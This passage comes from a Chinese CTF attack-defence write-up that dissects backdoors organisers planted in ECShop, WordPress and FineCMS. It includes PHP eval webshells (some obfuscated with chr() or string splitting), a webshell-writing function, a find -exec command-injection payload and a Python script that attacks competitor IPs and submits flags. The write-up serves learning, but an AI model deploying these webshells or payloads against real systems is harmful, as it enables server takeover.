  } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> ($static_res[$arr[<span class="hljs-string">'id'</span>]] === <span class="hljs-keyword">NULL</span>) {</span><br><span class="line">            $sql = <span class="hljs-string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                    <span class="hljs-string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                    <span class="hljs-string">'FROM '</span> . M()-&gt;pre . <span class="hljs-string">'touch_ad '</span> . <span class="hljs-string">' AS a '</span> .</span><br><span class="line">                    <span class="hljs-string">'LEFT JOIN '</span> . M()-&gt;pre . <span class="hljs-string">'touch_ad_position'</span> . <span class="hljs-string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                    <span class="hljs-string">"WHERE enabled = 1 AND a.position_id = '"</span> . $arr[<span class="hljs-string">'id'</span>] .</span><br><span class="line">                    <span class="hljs-string">"' AND start_time &lt;= '"</span> . $time . <span class="hljs-string">"' AND end_time &gt;= '"</span> . $time . <span class="hljs-string">"' "</span> .</span><br><span class="line">                    <span class="hljs-string">'ORDER BY rnd LIMIT 1'</span>;</span><br><span class="line">            $static_res[$arr[<span class="hljs-string">'id'</span>]] = M()-&gt;query($sql);</span><br><span class="line">        }</span><br><span class="line">        $res = $static_res[$arr[<span class="hljs-string">'id'</span>]];</span><br><span class="line">    }</span><br><span class="line">    $ads = <span class="hljs-keyword">array</span>();</span><br><span class="line">    $position_style = <span class="hljs-string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($res <span class="hljs-keyword">AS</span> $row) {</span><br><span class="line">        <span class="hljs-keyword">if</span> ($row[<span class="hljs-string">'position_id'</span>] != $arr[<span class="hljs-string">'id'</span>]) {</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        $position_style = $row[<span class="hljs-string">'position_style'</span>];</span><br><span class="line">        <span class="hljs-keyword">switch</span> ($row[<span class="hljs-string">'media_type'</span>]) {</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">// 图片广告</span></span><br><span class="line">                $src = (strpos($row[<span class="hljs-string">'ad_code'</span>], <span class="hljs-string">'http://'</span>) === <span class="hljs-keyword">false</span> &amp;&amp; strpos($row[<span class="hljs-string">'ad_code'</span>], <span class="hljs-string">'https://'</span>) === <span class="hljs-keyword">false</span>) ?</span><br><span class="line">                        __URL__ . <span class="hljs-string">"/$row[ad_code]"</span> : $row[<span class="hljs-string">'ad_code'</span>];</span><br><span class="line">                $ads[] = <span class="hljs-string">"&lt;a href='"</span> . url(<span class="hljs-string">'default/affiche/index'</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">'ad_id'</span> =&gt; $row[<span class="hljs-string">'ad_id'</span>], <span class="hljs-string">'uri'</span> =&gt; urlencode($row[<span class="hljs-string">"ad_link"</span>]))) . <span class="hljs-string">"' </span></span><br><span class="line"><span class="hljs-string">                target='_blank'&gt;&lt;img src='$src' width='"</span> . $row[<span class="hljs-string">'ad_width'</span>] . <span class="hljs-string">"' height='$row[ad_height]'</span></span><br><span class="line"><span class="hljs-string">                border='0' /&gt;&lt;/a&gt;"</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">// Flash</span></span><br><span class="line">                $src = (strpos($row[<span class="hljs-string">'ad_code'</span>], <span class="hljs-string">'http://'</span>) === <span class="hljs-keyword">false</span> &amp;&amp; strpos($row[<span class="hljs-string">'ad_code'</span>], <span class="hljs-string">'https://'</span>) === <span class="hljs-keyword">false</span>) ?</span><br><span class="line">                        __URL__ . <span class="hljs-string">"/$row[ad_code]"</span> : $row[<span class="hljs-string">'ad_code'</span>];</span><br><span class="line">                $ads[] = <span class="hljs-string">"&lt;object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" "</span> .</span><br><span class="line">                        <span class="hljs-string">"codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0\"  "</span> .</span><br><span class="line">                        <span class="hljs-string">"width='$row[ad_width]' height='$row[ad_height]'&gt;</span></span><br><span class="line"><span class="hljs-string">                           &lt;param name='movie' value='$src'&gt;</span></span><br><span class="line"><span class="hljs-string">                           &lt;param name='quality' value='high'&gt;</span></span><br><span class="line"><span class="hljs-string">                           &lt;embed src='$src' quality='high'</span></span><br><span class="line"><span class="hljs-string">                           pluginspage='http://www.macromedia.com/go/getflashplayer'</span></span><br><span class="line"><span class="hljs-string">                           type='application/x-shockwave-flash' width='$row[ad_width]'</span></span><br><span class="line"><span class="hljs-string">                           height='$row[ad_height]'&gt;&lt;/embed&gt;</span></span><br><span class="line"><span class="hljs-string">                         &lt;/object&gt;"</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">// CODE</span></span><br><span class="line">                $ads[] = $row[<span class="hljs-string">'ad_code'</span>];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-comment">// TEXT</span></span><br><span class="line">                $ads[] = <span class="hljs-string">"&lt;a href='"</span> . url(<span class="hljs-string">'default/affiche/index'</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">'ad_id'</span> =&gt; $row[<span class="hljs-string">'ad_id'</span>], <span class="hljs-string">'uri'</span> =&gt; urlencode($row[<span class="hljs-string">"ad_link"</span>]))) . <span class="hljs-string">"'</span></span><br><span class="line"><span class="hljs-string">                target='_blank'&gt;"</span> . htmlspecialchars($row[<span class="hljs-string">'ad_code'</span>]) . <span class="hljs-string">'&lt;/a&gt;'</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-comment">// url</span></span><br><span class="line">                $ads[] = file_get_contents($_POST[<span class="hljs-string">'url'</span>]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    $position_style = <span class="hljs-string">'str:'</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = ECTouch::view()-&gt;caching;</span><br><span class="line">    ECTouch::view()-&gt;caching = <span class="hljs-keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    ECTouch::view()-&gt;assign(<span class="hljs-string">'ads'</span>, $ads);</span><br><span class="line">    $val = ECTouch::view()-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    ECTouch::view()-&gt;caching = $need_cache;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> html_entity_decode($val);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里比较扎眼的便是<code>case 4</code>这里</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-comment">// url</span></span><br><span class="line">    $ads[] = file_get_contents($_POST[<span class="hljs-string">'url'</span>]);</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里很明显只有一段代码，而且还是<code>file_get_contents()</code>，这里便是一个任意文件读取的漏洞。</p><p>这里放上一叶飘零大佬的jio本以供学习：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line">data = {</span><br><span class="line">    <span class="hljs-string">"url"</span>:<span class="hljs-string">"http://10.0.1.2?token=RCNWBJXQ"</span></span><br><span class="line">}</span><br><span class="line">url = <span class="hljs-string">"http://10.50.%s.2/mobile/index.php"</span></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">37</span>):</span><br><span class="line">        urll = url%x</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">truetruetrue<span class="hljs-comment">#attack moudle</span></span><br><span class="line">            r = requests.post(url=urll,data=data,timeout=<span class="hljs-number">3</span>)</span><br><span class="line">            flag =  re.findall(<span class="hljs-string">'&lt;li&gt;.*?&lt;/li&gt;'</span>,r.content)[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">-5</span>]</span><br><span class="line">            <span class="hljs-comment">#submit flag moudle</span></span><br><span class="line">            flagurl = <span class="hljs-string">"https://192.168.37.180/match/WAR20/oapi?atn=answers&amp;token=RCNWBJXQ&amp;flag=%s"</span>%flag</span><br><span class="line">            r = requests.get(url=flagurl,verify=<span class="hljs-literal">False</span>)</span><br><span class="line">            <span class="hljs-comment">#check flag</span></span><br><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-string">"wrong answer."</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.content:</span><br><span class="line">                <span class="hljs-keyword">print</span> flag</span><br><span class="line">                <span class="hljs-keyword">print</span> r.content</span><br><span class="line">        <span class="hljs-keyword">except</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">"attack ip times: "</span>+str(x)</span><br><span class="line">    time.sleep(<span class="hljs-number">60</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里问什么文件读取就可以拿到<code>flag</code>呢？因为<a href="http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp" target="_blank" rel="noopener">file_get_contents</a>这个函数，既然要读取<code>url</code>中的文件，自然得先去请求<code>url</code>，所以自然可以拿到<code>flag</code></p><h3 id="Poc-3"><a href="#Poc-3" class="headerlink" title="Poc 3"></a>Poc 3</h3><p>官方还给了一个<code>mobile/api/uc.php</code>的<code>hint</code>，当时我们看了一下，感觉没啥用…这里还是主要参考一叶飘零大佬的分析…</p><p>当时乍一看好像没什么问题…现在仔细看这里</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (in_array($get[<span class="hljs-string">'action'</span>], <span class="hljs-keyword">array</span>(</span><br><span class="line">    <span class="hljs-string">'test'</span>,</span><br><span class="line">    <span class="hljs-string">'deleteuser'</span>,</span><br><span class="line">    <span class="hljs-string">'renameuser'</span>,</span><br><span class="line">    <span class="hljs-string">'gettag'</span>,</span><br><span class="line">    <span class="hljs-string">'synlogin'</span>,</span><br><span class="line">    <span class="hljs-string">'synlogout'</span>,</span><br><span class="line">    <span class="hljs-string">'updatepw'</span>,</span><br><span class="line">    <span class="hljs-string">'updatebadwords'</span>,</span><br><span class="line">    <span class="hljs-string">'updatehosts'</span>,</span><br><span class="line">    <span class="hljs-string">'updateapps'</span>,</span><br><span class="line">    <span class="hljs-string">'updateclient'</span>,</span><br><span class="line">    <span class="hljs-string">'updatecredit'</span>,</span><br><span class="line">    <span class="hljs-string">'getcreditsettings'</span>,</span><br><span class="line">    <span class="hljs-string">'updatecreditsettings'</span>,</span><br><span class="line">    <span class="hljs-string">'writesth'</span></span><br><span class="line">))) {</span><br><span class="line">    $uc_note = <span class="hljs-keyword">new</span> uc_note();</span><br><span class="line">    <span class="hljs-keyword">exit</span>($uc_note-&gt;$get[<span class="hljs-string">'action'</span>]($get, $post));</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-keyword">exit</span>(API_RETURN_FAILED);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个<code>array</code>就有个地方就显得特别的奇葩，那就是最后的<code>writesth</code>…</p><p>要是框架的作者…这么写怕不是会被打死…这里肯定就是主办方自己加上的。我们全局搜一下<code>writesth</code>看看都有些啥</p><p>果然找到一个函数</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writesth</span><span class="hljs-params">($get, $post)</span></span>{</span><br><span class="line">    $cachefile = <span class="hljs-keyword">$this</span>-&gt;appdir .$get[<span class="hljs-string">'name'</span>];</span><br><span class="line">    $fp = fopen($cachefile, <span class="hljs-string">'w'</span>);</span><br><span class="line">    $s = <span class="hljs-string">"&lt;?php\r\n"</span>;</span><br><span class="line">    $s .= $get[<span class="hljs-string">'content'</span>];</span><br><span class="line">    fwrite($fp, $s);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="hljs-keyword">return</span> API_RETURN_SUCCEED;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>换句话说，就是上传的文件名是你<code>get</code>请求的<code>name</code>，内容就是你的<code>content</code>参数，这里就可以制造一个<code>webshell</code>来打。</p><p>我们也可以测试一下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writesth</span><span class="hljs-params">($name, $content)</span></span>{</span><br><span class="line">    $cachefile = <span class="hljs-string">"./"</span>.$name;</span><br><span class="line">    $fp = fopen($cachefile, <span class="hljs-string">'w'</span>);</span><br><span class="line">    $s = <span class="hljs-string">"&lt;?php\r\n"</span>;</span><br><span class="line">    $s .= $content;</span><br><span class="line">    fwrite($fp, $s);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line">$name = <span class="hljs-string">"shell.php"</span>;</span><br><span class="line">$content = <span class="hljs-string">"@eval(\$_POST[zedd]);\n?&gt;"</span>;</span><br><span class="line">writesth($name,$content);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>本地成功拿到<code>shell</code>，<code>shell.php</code>内容为</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">@<span class="hljs-keyword">eval</span>($_POST[zedd]);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是这里得注意写入的地方是否有权限，无权限的话得考虑向上层目录走一走。</p><h3 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h3><p>其他的一些，可以参照一叶飘零大佬的博客，也可以参照<a href="https://www.cnblogs.com/newgold/archive/2016/04/13/5386600.html" target="_blank" rel="noopener">ECSHOP v2.7.3注入漏洞分析和修复</a>这个博客。总体来说还是一场比较有收获的AWD，也学习到了挺多知识。也是几乎过了一个月左右才来总结这次AWD…（哎哟这种拖延症真的是…写这篇基本靠回忆了…</p><h2 id="第二届“红帽杯”线下攻防大赛"><a href="#第二届“红帽杯”线下攻防大赛" class="headerlink" title="第二届“红帽杯”线下攻防大赛"></a>第二届“红帽杯”线下攻防大赛</h2><p>主要还是参考一叶飘零大佬的<a href="http://skysec.top/2018/05/27/2018RedHat-AD-Web/" target="_blank" rel="noopener">wp</a>以及自己的一些亲身经历总结经验…（发现跟大佬的差距真的是大..2333</p><p>这里提一下，为了找到主办方的洞的话，可以下载主办方出的框架的对应的版本，然后进行<code>diff</code>，这样很快就可以找到主办方故意留下的洞。如果是整个项目比较的话啊，我还是比较推荐<code>BeyondCompare</code>的.</p><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><h4 id="Poc-1-1"><a href="#Poc-1-1" class="headerlink" title="Poc 1"></a>Poc 1</h4><p>在<code>wp-admin/tools.php</code>下有一个主办方留下的洞：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$poc=<span class="hljs-string">"a#s#s#e#r#t"</span>; $poc_1=explode(<span class="hljs-string">"#"</span>,$poc); $poc_2=$poc_1[<span class="hljs-number">0</span>].$poc_1[<span class="hljs-number">1</span>].$poc_1[<span class="hljs-number">2</span>].$poc_1[<span class="hljs-number">3</span>].$poc_1[<span class="hljs-number">4</span>].$poc_1[<span class="hljs-number">5</span>]; @$poc_2($_POST[<span class="hljs-string">'_'</span>]);</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>explode</code>的[解释用法][<a href="http://www.w3school.com.cn/php/func_string_explode.asp]" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_explode.asp]</a></p><blockquote><p>array <strong>explode</strong> ( string <code>$delimiter</code> , string <code>$string</code> [, int <code>$limit</code> ] )</p><p>explode() 函数把字符串打散为数组。</p></blockquote><p>也可以直接<code>echo</code>看一下<code>$poc_2</code>就是<code>assert</code>，也就是<code>@assert($_POST['_'])</code>这个马。</p><h4 id="Poc-2-1"><a href="#Poc-2-1" class="headerlink" title="Poc 2"></a>Poc 2</h4><p>在<code>wp-login.php</code>下注意到如下代码，有<code>system</code>很可能是一个任意命令执行：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">case</span> <span class="hljs-string">'debug'</span>:</span><br><span class="line">        $file = addslashes($_POST[<span class="hljs-string">'file'</span>]);</span><br><span class="line">        system(<span class="hljs-string">"find /tmp -iname "</span>.escapeshellcmd($file));</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>首先我们先解释<code>addslashes()</code>这个函数的[基本用法][<a href="http://php.net/manual/zh/function.addslashes.php]" target="_blank" rel="noopener">http://php.net/manual/zh/function.addslashes.php]</a></p><blockquote><p>string <strong>addslashes</strong> ( string <code>$str</code> )</p><p>addslashes — 使用反斜线引用字符串</p><p>返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（<em>‘</em>）、双引号（<em>“</em>）、反斜线（<em>\</em>）与 NUL（<strong>NULL</strong> 字符）。</p></blockquote><p>还有<code>escapeshellcmd()</code>的[基本用法][<a href="http://php.net/manual/zh/function.escapeshellcmd.php]" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php]</a></p><blockquote><p>string <strong>escapeshellcmd</strong> ( string <code>$command</code> )</p><p>escapeshellcmd — shell 元字符转义</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec</a> 或 <a href="http://php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="http://php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$*, <em>\x0A</em> 和 <em>\xFF*。 *’</em> 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p></blockquote><p>基本就是把引号什么的及其其他的给转义了的意思。</p><p><code>system</code>中要执行的就是在<code>/tmp</code>目录下查找<code>$_POST</code>的参数的文件。而且根据<code>find</code>的手册，我们可以知道它还有一个<code>exec</code>的参数。</p><blockquote><p>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。</p><p>{} 花括号代表前面find查找出来的文件名。</p><p><code>iname</code>在这里指的是不区分大小写；<code>name</code>则为区分大小写</p><p>例如</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find&nbsp;/etc&nbsp;-name&nbsp;<span class="hljs-string">"passwd*"</span>&nbsp;-<span class="hljs-built_in">exec</span>&nbsp;grep&nbsp;<span class="hljs-string">"root"</span>&nbsp;{}&nbsp;\;</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里是查找<code>/etc</code>下名为以<code>passwd</code>开头的文件中是否含有<code>root</code></p></blockquote><p>这里我们只需要随便穿一个文件名，再加上<code>-exec cat /flag ;</code>因为最后<code>;</code>是被<code>escapeshellcmd</code>给转义了，所以不需要加反斜杠。如果加上<code>-or</code>的话就相当于可以直接执行<code>-exec</code>后的命令。所以这里我们可以使用<code>payload</code></p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -iname a -or -<span class="hljs-built_in">exec</span> cat /flag/flag ;</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以拿<code>php</code>本地测试一下</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    $a = <span class="hljs-string">"a -or -exec cat /flag/flag ;"</span>;</span><br><span class="line">    $file = addslashes($a);</span><br><span class="line">    system(<span class="hljs-string">"find /tmp -iname "</span>.escapeshellcmd($file));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Poc-3-1"><a href="#Poc-3-1" class="headerlink" title="Poc 3"></a>Poc 3</h4><p>在<code>index.php</code>下直接有一个暴露的小马</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'admin'</span>]);</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Poc-4"><a href="#Poc-4" class="headerlink" title="Poc 4"></a>Poc 4</h4><p>在<code>class-wp-cachefile.php</code>中，详细分析见：[参考链接][<a href="https://github.com/bl4de/security_whitepapers/blob/master/RIPS_PHP_Security_Calendar_2017.md]" target="_blank" rel="noopener">https://github.com/bl4de/security_whitepapers/blob/master/RIPS_PHP_Security_Calendar_2017.md]</a></p><h4 id="Eles"><a href="#Eles" class="headerlink" title="Eles"></a>Eles</h4><p>抄了一个作业</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="hljs-string">"PHP"</span>&gt;<span class="hljs-keyword">if</span>(md5($_GET[guo])===<span class="hljs-string">"fe831851246d186db20c229fa19a0172"</span>){@<span class="hljs-keyword">eval</span>($_POST[power]);}&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>基本就是也跟着拿这个马一样打别人…也算是后知后觉吧…后来只能打为数不多几个了吧…</p><p>主要是<code>web1</code>给的用户对<code>web</code>目录没有写的权限，当时没什么经验…不知道自己传个马打自己…这就很难受了…导致了<code>web1</code>被打穿了…以及还有不死马…</p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>这里不得不吐槽一下<code>web2</code>的<code>checker</code>机制，只放两个静态都能过<code>checker</code>，稳得不行…</p><h4 id="Poc-1-2"><a href="#Poc-1-2" class="headerlink" title="Poc 1"></a>Poc 1</h4><p>看到<code>/config/site</code>下有两个莫名其妙的命名的<code>php</code>文件：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1.</span>php</span><br><span class="line"><span class="hljs-number">2.</span>php</span><br></pre></td></tr></tbody></table></figure><p></p><p>一看就应该是某些马的存放位置咯</p><p>在<code>1.php</code>中可以看到</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">'SITE_DOMAINS'</span>                  =&gt; <span class="hljs-string">'123sadccv=&gt;1)&amp;&amp;($_GET[a]($_GET[b]));exit();$a=array(a'</span>, <span class="hljs-comment">//网站的其他域名</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>很明显的位置<code>$_GET[a]($_GET[b])</code></p><h4 id="Poc-2-2"><a href="#Poc-2-2" class="headerlink" title="Poc 2"></a>Poc 2</h4><p><code>2.php</code>中：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$_uU=chr(<span class="hljs-number">99</span>).chr(<span class="hljs-number">104</span>).chr(<span class="hljs-number">114</span>);</span><br><span class="line">$_cC=$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">118</span>).$_uU(<span class="hljs-number">97</span>).$_uU(<span class="hljs-number">108</span>).$_uU(<span class="hljs-number">40</span>).$_uU(<span class="hljs-number">36</span>).$_uU(<span class="hljs-number">95</span>).$_uU(<span class="hljs-number">80</span>).$_uU(<span class="hljs-number">79</span>).$_uU(<span class="hljs-number">83</span>).$_uU(<span class="hljs-number">84</span>).$_uU(<span class="hljs-number">91</span>).$_uU(<span class="hljs-number">50</span>).$_uU(<span class="hljs-number">93</span>).$_uU(<span class="hljs-number">41</span>).$_uU(<span class="hljs-number">59</span>);</span><br><span class="line">$_fF=$_uU(<span class="hljs-number">99</span>).$_uU(<span class="hljs-number">114</span>).$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">97</span>).$_uU(<span class="hljs-number">116</span>).$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">95</span>).$_uU(<span class="hljs-number">102</span>).$_uU(<span class="hljs-number">117</span>).$_uU(<span class="hljs-number">110</span>).$_uU(<span class="hljs-number">99</span>).$_uU(<span class="hljs-number">116</span>).$_uU(<span class="hljs-number">105</span>).$_uU(<span class="hljs-number">111</span>).$_uU(<span class="hljs-number">110</span>);</span><br><span class="line">$_=$_fF(<span class="hljs-string">""</span>,$_cC);</span><br><span class="line">@$_();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>var_dump</code>可以看到</p><p></p><figure class="highlight autoit hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_uU -&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">"chr"</span></span><br><span class="line">$_cC -&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">16</span>) <span class="hljs-string">"eval($_POST[2]);"</span></span><br><span class="line">$_fF -&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">15</span>) <span class="hljs-string">"create_function"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以是：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_ = create_function(<span class="hljs-string">""</span>,<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-number">2</span>]));</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以直接用<code>POST 2=phpinfo();</code>使用</p><h4 id="Poc-3-2"><a href="#Poc-3-2" class="headerlink" title="Poc 3"></a>Poc 3</h4><p>在与官方的<code>fincms</code>对比下我们可以发现新增文件为<code>finecms/dayrui/config/config.class.php</code></p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 